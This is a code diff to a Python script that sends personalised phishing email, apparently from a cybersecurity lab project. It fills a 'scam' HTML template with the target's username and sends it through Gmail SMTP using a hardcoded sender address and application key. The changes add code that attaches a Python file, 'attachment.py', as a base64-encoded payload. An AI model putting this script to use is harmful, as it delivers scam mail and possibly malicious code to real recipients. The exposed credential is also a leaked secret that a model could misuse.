@@ -3,16 +3,30 @@ import create_attachment
 import smtplib
 import ssl
 from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
+from email import encoders
 
+# The mail we send the phishing mail from.
 mail_sender_address = "labcyber523@gmail.com"
+
+# The application key for the mail we send the phishing mail from.
 application_key = "avowmnjsepifvwhi"
+
+# The smtp server and port of the mail we send the phishing mail from.
 smtp_server = "smtp.gmail.com"
 smtp_port = 465
+
+# The html file we send in the phishing mail, this will be the scam mail itself.
+scam_html_file = "scam.html"
+
+# The attachment file we send in the phishing mail.
+attachment_file = "attachment.py"
 
 """
 creates the mail and sends the mail.
 """
+
 
 def function(array):
     username = sys.argv[1]
@@ -23,7 +37,7 @@ def function(array):
     kids = sys.argv[6]
     mail_receiver_address = username + "@" + mail_service_name
 
-    fp = open("scam.html", "r")
+    fp = open(scam_html_file , "r")
     html = fp.read()
     html = html.replace("user", username)
     fp.close()
@@ -36,6 +50,15 @@ def function(array):
     html_message = MIMEText(html, "html")
 
     message.attach(html_message)
+
+    with open(attachment_file, "rb") as file:
+        attachment = MIMEBase("application", "octet-stream")
+        attachment.set_payload(file.read())
+        encoders.encode_base64(attachment)
+        attachment.add_header("Content-Disposition",
+                              f"attachment; filename={attachment_file}")
+        message.attach(attachment)
+
     context = ssl.create_default_context()
 
     with smtplib.SMTP_SSL("smtp.gmail.com", smtp_port, context=context) as server:
